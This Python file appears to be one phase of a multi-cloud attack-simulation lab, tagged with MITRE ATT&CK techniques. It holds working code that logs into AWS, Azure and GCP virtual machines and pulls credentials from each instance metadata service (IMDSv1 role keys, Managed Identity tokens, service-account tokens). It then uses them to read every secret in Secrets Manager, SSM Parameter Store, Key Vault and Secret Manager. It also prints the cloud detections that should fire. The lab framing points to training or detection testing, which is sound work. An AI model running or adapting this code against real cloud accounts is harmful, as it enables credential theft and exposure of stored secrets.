"""
phase_2_credential_harvest.py -- Phase 2: Multi-Cloud Credential Harvesting
MITRE ATT&CK: T1552.005, T1528, T1555.006, T1580, T1119
"""
import json
from typing import Any, Dict, Optional

import paramiko

from utils import (
    log_event, mark_step_complete, print_detection, print_error, print_info,
    print_link, print_value, print_phase_banner, print_step, print_success,
    print_warning, wait_for_ssh,
)

PHASE_NUM = 2
PHASE_NAME = "Credential Harvesting"
PHASE_DESCRIPTION = "Multi-cloud IMDS credential theft"


def _ssh_exec(ssh, command, timeout=30):
    try:
        _, stdout, stderr = ssh.exec_command(command, timeout=timeout)
        out = stdout.read().decode("utf-8", errors="replace").strip()
        err = stderr.read().decode("utf-8", errors="replace").strip()
        return out if out else f"ERROR: {err}" if err else ""
    except Exception as exc:
        return f"ERROR: {exc}"


def _ssh_key(host, user, key_path):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=host, username=user, key_filename=key_path,
                    timeout=15, look_for_keys=False, allow_agent=False)
        return ssh
    except Exception as exc:
        print_error(f"SSH to {host} failed: {exc}"); return None


def _ssh_pass(host, user, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=host, username=user, password=password,
                    timeout=15, look_for_keys=False, allow_agent=False)
        return ssh
    except Exception as exc:
        print_error(f"SSH to {host} failed: {exc}"); return None


def step_harvest_aws(config) -> Dict[str, Any]:
    """Step 2.1: SSH into EC2, steal IMDS creds, exfiltrate secrets."""
    print_step("2.1", "AWS: IMDS credential theft + Secrets Manager + SSM")
    results = {"cloud": "aws", "secrets": [], "parameters": []}

    host = config.aws_instance_public_ip
    if not host:
        print_error("AWS EC2 IP not available"); return results

    print_info(f"SSH into EC2 at {host} (user: ec2-user, key: lab-key.pem)")
    if not wait_for_ssh(host, max_wait=60):
        print_error(f"SSH to {host} timed out"); return results

    ssh = _ssh_key(host, "ec2-user", config.ssh_key_path)
    if not ssh:
        return results

    try:
        print_success(f"Connected to AWS EC2 ({host})")

        # IMDS credential theft
        print_info("Querying IMDS at http://169.254.169.254 (no authentication with IMDSv1)...")
        role = _ssh_exec(ssh, "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/")
        if role.startswith("ERROR"):
            print_error(f"IMDS query failed: {role}"); return results

        creds_raw = _ssh_exec(ssh, f"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")
        try:
            creds = json.loads(creds_raw)
        except json.JSONDecodeError:
            print_error("Failed to parse IMDS credentials"); return results

        print_success(f"IAM role credentials stolen via IMDSv1!")
        print_value("Role name", role)
        print_value("AccessKeyId", creds.get("AccessKeyId", "N/A"))
        print_value("Expiration", creds.get("Expiration", "N/A"))
        print_value("Token prefix", creds.get("Token", "")[:40] + "...")
        results["role_name"] = role
        results["access_key_id"] = creds.get("AccessKeyId", "")
        print_detection("CSPM", "EC2 instance with IMDSv1 enabled (http_tokens = optional)")

        cred_env = (
            f"export AWS_ACCESS_KEY_ID='{creds['AccessKeyId']}' "
            f"AWS_SECRET_ACCESS_KEY='{creds['SecretAccessKey']}' "
            f"AWS_SESSION_TOKEN='{creds['Token']}'"
        )

        # Verify identity
        identity = _ssh_exec(ssh, f"{cred_env} && aws sts get-caller-identity --output json 2>/dev/null")
        try:
            id_data = json.loads(identity)
            print_value("Assumed identity", id_data.get("Arn", "N/A"))
        except json.JSONDecodeError:
            pass

        # Secrets Manager
        print_info("Enumerating Secrets Manager with stolen credentials...")
        secrets_out = _ssh_exec(ssh, f"{cred_env} && aws secretsmanager list-secrets --query 'SecretList[].Name' --output json 2>/dev/null")
        try:
            secret_names = json.loads(secrets_out)
            print_success(f"Found {len(secret_names)} secrets in Secrets Manager")
            for name in secret_names:
                val = _ssh_exec(ssh, f"{cred_env} && aws secretsmanager get-secret-value --secret-id '{name}' --query 'SecretString' --output text 2>/dev/null")
                stolen = bool(val and not val.startswith("ERROR"))
                results["secrets"].append({"name": name, "stolen": stolen})
                if stolen:
                    # Truncate for display
                    display_val = val[:80] + "..." if len(val) > 80 else val
                    print_success(f"  Stolen: {name}")
                    print_value("    Value", display_val)
        except json.JSONDecodeError:
            print_warning("Could not enumerate secrets")

        # SSM Parameter Store
        print_info("Enumerating SSM Parameter Store...")
        params_out = _ssh_exec(ssh, f"{cred_env} && aws ssm describe-parameters --query 'Parameters[].Name' --output json 2>/dev/null")
        try:
            param_names = json.loads(params_out)
            for name in param_names:
                val = _ssh_exec(ssh, f"{cred_env} && aws ssm get-parameter --name '{name}' --with-decryption --query 'Parameter.Value' --output text 2>/dev/null")
                stolen = bool(val and not val.startswith("ERROR"))
                results["parameters"].append({"name": name, "stolen": stolen})
                if stolen:
                    display_val = val[:80] + "..." if len(val) > 80 else val
                    print_success(f"  SSM stolen: {name}")
                    print_value("    Value", display_val)
        except json.JSONDecodeError:
            pass

        print_detection("CDR", "Burst of GetSecretValue calls from EC2 role")
        print_detection("CIEM", "IAM role has Resource: * on secretsmanager:GetSecretValue")
    finally:
        ssh.close()

    mark_step_complete("2.1")
    return results


def step_harvest_azure(config) -> Dict[str, Any]:
    """Step 2.2: SSH into Azure VM, steal MI token, exfiltrate Key Vault."""
    print_step("2.2", "Azure: Managed Identity token theft + Key Vault")
    results = {"cloud": "azure", "secrets": []}

    host = config.azure_vm_public_ip
    if not host:
        print_error("Azure VM IP not available"); return results

    print_info(f"SSH into Azure VM at {host} (user: azureuser, password auth)")
    if not wait_for_ssh(host, max_wait=60):
        print_error(f"SSH to {host} timed out"); return results

    ssh = _ssh_pass(host, "azureuser", config.azure_vm_password)
    if not ssh:
        return results

    try:
        print_success(f"Connected to Azure VM ({host})")

        print_info('Requesting Managed Identity token from IMDS (header: "Metadata: true")...')
        token_out = _ssh_exec(ssh,
            'curl -s -H "Metadata: true" '
            '"http://169.254.169.254/metadata/identity/oauth2/token'
            '?api-version=2018-02-01'
            '&resource=https%3A%2F%2Fvault.azure.net"', timeout=15)

        try:
            token_data = json.loads(token_out)
            token = token_data.get("access_token", "")
            if not token:
                print_error("Token missing from IMDS response"); return results
            print_success("Managed Identity Bearer token stolen!")
            print_value("Token type", token_data.get("token_type", "Bearer"))
            print_value("Resource", token_data.get("resource", "https://vault.azure.net"))
            print_value("Token prefix", token[:40] + "...")
            print_value("Token length", f"{len(token)} characters")
            results["token_obtained"] = True
            print_detection("CDR", "Managed Identity token request from unusual process")
        except json.JSONDecodeError:
            print_error(f"Azure IMDS parse failed"); return results

        vault = config.azure_keyvault_name
        if not vault:
            print_warning("Key Vault name not available"); return results

        print_info(f"Using stolen token to access Key Vault: {vault}")
        secrets_out = _ssh_exec(ssh,
            f'curl -s -H "Authorization: Bearer {token}" '
            f'"https://{vault}.vault.azure.net/secrets?api-version=7.4"', timeout=15)

        try:
            items = json.loads(secrets_out).get("value", [])
            print_success(f"Found {len(items)} secrets in Key Vault")
            for item in items:
                sname = item["id"].split("/")[-1]
                val_out = _ssh_exec(ssh,
                    f'curl -s -H "Authorization: Bearer {token}" '
                    f'"https://{vault}.vault.azure.net/secrets/{sname}?api-version=7.4"', timeout=15)
                try:
                    val_data = json.loads(val_out)
                    if "value" in val_data:
                        secret_val = val_data["value"]
                        results["secrets"].append({"name": sname, "stolen": True})
                        print_success(f"  Stolen: {sname}")
                        print_value("    Value", secret_val[:80] + "..." if len(secret_val) > 80 else secret_val)
                    else:
                        results["secrets"].append({"name": sname, "stolen": False})
                except json.JSONDecodeError:
                    results["secrets"].append({"name": sname, "stolen": False})

            print_link("View in Azure Portal", f"https://portal.azure.com/#view/Microsoft_Azure_KeyVault")
            print_detection("CDR", "Bulk Key Vault SecretGet operations")
            print_detection("CSPM", "Key Vault allows public network access")
        except json.JSONDecodeError:
            print_error("Failed to list Key Vault secrets")
    finally:
        ssh.close()

    mark_step_complete("2.2")
    return results


def step_harvest_gcp(config) -> Dict[str, Any]:
    """Step 2.3: SSH into GCE, steal SA token, exfiltrate Secret Manager."""
    import subprocess as sp
    import base64

    print_step("2.3", "GCP: Metadata server token theft + Secret Manager")
    results = {"cloud": "gcp", "secrets": []}

    instance = config.gcp_instance_name
    zone = config.gcp_instance_zone
    if not instance or not zone:
        print_error("GCP instance details not available"); return results

    def _gsh(cmd, timeout=30):
        try:
            r = sp.run(["gcloud", "compute", "ssh", instance, f"--zone={zone}",
                        f"--command={cmd}", "--quiet"],
                       capture_output=True, text=True, timeout=timeout)
            return r.stdout.strip() if r.returncode == 0 else f"ERROR: {r.stderr.strip()}"
        except sp.TimeoutExpired:
            return "ERROR: timeout"
        except Exception as e:
            return f"ERROR: {e}"

    print_info(f"SSH into GCE instance {instance} via gcloud compute ssh")
    print_info('Requesting SA token from metadata server (header: "Metadata-Flavor: Google")...')

    token_out = _gsh('curl -s -H "Metadata-Flavor: Google" '
        '"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"')

    try:
        td = json.loads(token_out)
        token = td.get("access_token", "")
        if not token:
            print_error("Token missing from GCP metadata"); return results
        print_success("GCP Service Account OAuth2 token stolen!")
        print_value("Token type", td.get("token_type", "Bearer"))
        print_value("Expires in", f"{td.get('expires_in', '?')} seconds")
        print_value("Token prefix", token[:40] + "...")
        results["token_obtained"] = True
    except json.JSONDecodeError:
        print_error(f"GCP metadata parse failed"); return results

    sa = _gsh('curl -s -H "Metadata-Flavor: Google" '
        '"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"')
    proj = _gsh('curl -s -H "Metadata-Flavor: Google" '
        '"http://metadata.google.internal/computeMetadata/v1/project/project-id"')
    print_value("Service Account", sa)
    print_value("Project ID", proj)
    results["sa_email"] = sa
    results["project_id"] = proj

    print_info("Using stolen token to access Secret Manager via REST API...")
    secrets_out = _gsh(f'curl -s -H "Authorization: Bearer {token}" '
        f'"https://secretmanager.googleapis.com/v1/projects/{proj}/secrets"')

    try:
        secrets_list = json.loads(secrets_out).get("secrets", [])
        print_success(f"Found {len(secrets_list)} secrets in Secret Manager")
        for secret in secrets_list:
            sname = secret["name"].split("/")[-1]
            val_out = _gsh(f'curl -s -H "Authorization: Bearer {token}" '
                f'"https://secretmanager.googleapis.com/v1/projects/{proj}'
                f'/secrets/{sname}/versions/latest:access"')
            try:
                payload = json.loads(val_out).get("payload", {}).get("data", "")
                if payload:
                    import base64 as b64
                    decoded = b64.b64decode(payload).decode("utf-8", errors="replace")
                    results["secrets"].append({"name": sname, "stolen": True})
                    print_success(f"  Stolen: {sname}")
                    print_value("    Value", decoded[:80] + "..." if len(decoded) > 80 else decoded)
                else:
                    results["secrets"].append({"name": sname, "stolen": False})
            except (json.JSONDecodeError, Exception):
                results["secrets"].append({"name": sname, "stolen": False})

        print_link("View in GCP Console", f"https://console.cloud.google.com/security/secret-manager?project={proj}")
        print_detection("CDR", "Burst of AccessSecretVersion calls from GCE VM")
        print_detection("CIEM", "SA has project-level secretAccessor role")
    except json.JSONDecodeError:
        print_error("Failed to list GCP secrets")

    mark_step_complete("2.3")
    return results


STEPS = [
    ("2.1", "AWS: IMDS + Secrets Manager + SSM", step_harvest_aws),
    ("2.2", "Azure: Managed Identity + Key Vault", step_harvest_azure),
    ("2.3", "GCP: Metadata server + Secret Manager", step_harvest_gcp),
]
INDEPENDENT_STEPS = True

def run_phase(config) -> Dict[str, Any]:
    print_phase_banner(2, "CREDENTIAL HARVESTING -- Multi-Cloud IMDS Exploitation")
    results = {}
    for step_id, _, step_func in STEPS:
        try:
            results[step_id] = step_func(config)
        except RuntimeError as exc:
            print_error(str(exc))
        except Exception as exc:
            print_error(f"Step {step_id} failed: {exc}")

    total = sum(len(r.get("secrets", [])) for r in results.values() if isinstance(r, dict))
    params = sum(len(r.get("parameters", [])) for r in results.values() if isinstance(r, dict))
    print_success(f"Total: {total} secrets + {params} parameters across 3 clouds")
    return results
